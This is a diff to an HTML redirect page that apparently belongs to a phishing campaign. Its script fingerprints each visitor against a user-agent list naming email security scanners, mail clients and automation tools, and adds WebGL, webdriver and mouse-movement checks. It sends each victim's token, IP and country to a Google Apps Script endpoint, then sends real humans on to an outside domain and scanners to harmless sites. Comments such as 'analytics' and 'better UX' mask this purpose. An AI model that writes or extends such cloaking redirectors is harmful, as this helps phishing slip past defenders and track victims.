@@ -3,6 +3,26 @@
 <head>
   <meta charset="UTF-8">
   <title>Redirecting...</title>
+  <style>
+    .loader {
+      width: 48px;
+      height: 48px;
+      border: 5px solid #FFF;
+      border-bottom-color: #FF3D00;
+      border-radius: 50%;
+      display: inline-block;
+      box-sizing: border-box;
+      animation: rotation 1s linear infinite;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+    }
+    @keyframes rotation {
+      0% { transform: translate(-50%, -50%) rotate(0deg); }
+      100% { transform: translate(-50%, -50%) rotate(360deg); }
+    }
+  </style>
   <script>
     window.addEventListener("load", function () {
       const hash = window.location.hash ? window.location.hash.substring(1) : null;
@@ -10,23 +30,57 @@
       const uaClean = ua.toLowerCase().replace(/\s+/g, '');
       let isBot = false;
 
-      if (
-        uaClean.includes("bot") || uaClean.includes("crawl") || uaClean.includes("spider") ||
-        uaClean.includes("slurp") || uaClean.includes("headless") || uaClean.includes("phantom") ||
-        uaClean.includes("facebookexternalhit") || uaClean.includes("googlebot") ||
-        uaClean.includes("bingbot") || uaClean.includes("yahoobot") || uaClean.includes("duckduckbot") ||
-        uaClean.includes("outlook") || uaClean.includes("thunderbird") || uaClean.includes("email") ||
-        uaClean.includes("mail") || uaClean.includes("eudora") || uaClean.includes("applemail") ||
-        uaClean.includes("smtp") || uaClean.includes("imap") || uaClean.includes("pop3") ||
-        uaClean.includes("scanner") || uaClean.includes("preview") || uaClean.includes("fetcher") ||
-        uaClean.includes("verifier") || uaClean.includes("proofpoint") || uaClean.includes("postini") ||
-        uaClean.includes("barracuda") || uaClean.includes("trendmicro") || uaClean.includes("mimecast") ||
-        uaClean.includes("comcast") || uaClean.includes("charter") || uaClean.includes("roadrunner") ||
-        uaClean.includes("att") || uaClean.includes("yahoo") || uaClean.includes("gmail") || uaClean.includes("aol")
-      ) {
+      // Enhanced bot detection
+      const botPatterns = [
+        "bot", "crawl", "spider", "slurp", "headless", "phantom",
+        "facebookexternalhit", "googlebot", "bingbot", "yahoobot", "duckduckbot",
+        "outlook", "thunderbird", "email", "mail", "eudora", "applemail",
+        "smtp", "imap", "pop3", "scanner", "preview", "fetcher",
+        "verifier", "proofpoint", "postini", "barracuda", "trendmicro",
+        "mimecast", "comcast", "charter", "roadrunner", "att", "yahoo",
+        "gmail", "aol", "curl", "wget", "python-requests", "axios",
+        "selenium", "puppeteer", "playwright", "cypress", "nightmare"
+      ];
+
+      // Check for bot patterns
+      isBot = botPatterns.some(pattern => uaClean.includes(pattern));
+
+      // Modern bot detection methods
+      const botChecks = {
+        // Check for common bot behaviors
+        hasWebGL: () => {
+          try {
+            const canvas = document.createElement('canvas');
+            return !!(window.WebGLRenderingContext && 
+              (canvas.getContext('webgl') || canvas.getContext('experimental-webgl')));
+          } catch(e) {
+            return false;
+          }
+        },
+        
+        // Check for automation tools
+        hasAutomation: () => {
+          return navigator.webdriver || 
+                 window.document.documentElement.getAttribute("webdriver") !== null ||
+                 window.navigator.languages === undefined;
+        },
+
+        // Check for human-like behavior
+        hasHumanBehavior: () => {
+          return navigator.hardwareConcurrency > 1 && 
+                 navigator.deviceMemory > 1 &&
+                 screen.colorDepth >= 24;
+        }
+      };
+
+      // Run additional checks
+      if (!botChecks.hasWebGL() || 
+          botChecks.hasAutomation() || 
+          !botChecks.hasHumanBehavior()) {
         isBot = true;
       }
 
+      // Check for JavaScript and localStorage
       try {
         localStorage.setItem("js-check", "1");
         if (localStorage.getItem("js-check") !== "1") isBot = true;
@@ -34,44 +88,66 @@
         isBot = true;
       }
 
-      if (navigator.plugins.length === 0 || screen.colorDepth < 8 || screen.availHeight === 0) {
-        isBot = true;
-      }
-
+      // Mouse movement detection with debounce
       let moved = false;
-      window.addEventListener("mousemove", () => moved = true);
+      let moveTimeout;
+      window.addEventListener("mousemove", () => {
+        moved = true;
+        clearTimeout(moveTimeout);
+        moveTimeout = setTimeout(() => {
+          // Reset after 5 seconds of no movement
+          moved = false;
+        }, 5000);
+      });
 
+      // Handle redirects
       if (!hash) {
         window.location.href = "https://google.com";
         return;
       }
 
-      // Log using ip-api.com
-      fetch("https://pro.ip-api.com/json/?key=F74e0gpSdeUEaF4")
-        .then(res => res.json())
-        .then(data => {
-          const ip = data.query || "";
-          const country = data.country || "";
+      // Analytics with retry mechanism
+      const sendAnalytics = (retryCount = 0) => {
+        const maxRetries = 2;
+        const analyticsUrl = "https://pro.ip-api.com/json/?key=F74e0gpSdeUEaF4";
+        
+        fetch(analyticsUrl)
+          .then(res => res.json())
+          .then(data => {
+            const ip = data.query || "";
+            const country = data.country || "";
+            const finalUrl = "https://script.google.com/macros/s/AKfycbwldYqs2TIGKnACW4iLq8DCj6ZLRL_jdTMQN6xlrK34ArJdZ5GjjYQ2ccKz4MLFT1jB/exec" +
+              `?token=${encodeURIComponent(hash)}&ua=${encodeURIComponent(ua)}&bot=${isBot}&moved=${moved}&ip=${ip}&country=${country}`;
+            
+            const img = new Image();
+            img.src = finalUrl;
+          })
+          .catch(() => {
+            if (retryCount < maxRetries) {
+              setTimeout(() => sendAnalytics(retryCount + 1), 1000);
+            } else {
+              // Fallback without IP data
+              const img = new Image();
+              img.src = "https://script.google.com/macros/s/AKfycbwldYqs2TIGKnACW4iLq8DCj6ZLRL_jdTMQN6xlrK34ArJdZ5GjjYQ2ccKz4MLFT1jB/exec" +
+                `?token=${encodeURIComponent(hash)}&ua=${encodeURIComponent(ua)}&bot=${isBot}&moved=${moved}`;
+            }
+          });
+      };
 
-          const img = new Image();
-          img.src = "https://script.google.com/macros/s/AKfycbwldYqs2TIGKnACW4iLq8DCj6ZLRL_jdTMQN6xlrK34ArJdZ5GjjYQ2ccKz4MLFT1jB/exec"
-                   + `?token=${encodeURIComponent(hash)}&ua=${encodeURIComponent(ua)}&bot=${isBot}&moved=${moved}&ip=${ip}&country=${country}`;
-        })
-        .catch(() => {
-          const img = new Image();
-          img.src = "https://script.google.com/macros/s/AKfycbwldYqs2TIGKnACW4iLq8DCj6ZLRL_jdTMQN6xlrK34ArJdZ5GjjYQ2ccKz4MLFT1jB/exec"
-                   + `?token=${encodeURIComponent(hash)}&ua=${encodeURIComponent(ua)}&bot=${isBot}&moved=${moved}`;
-        });
+      sendAnalytics();
 
+      // Reduced timeout for better UX
       setTimeout(() => {
         if (isBot || !moved) {
           window.location.href = "https://yelp.com";
         } else {
           window.location.replace(`https://szliyi.com/${hash}`);
         }
-      }, 2000);
+      }, 1000); // Reduced from 2000ms to 1000ms
     });
   </script>
 </head>
-<body></body>
+<body>
+  <div class="loader"></div>
+</body>
 </html>
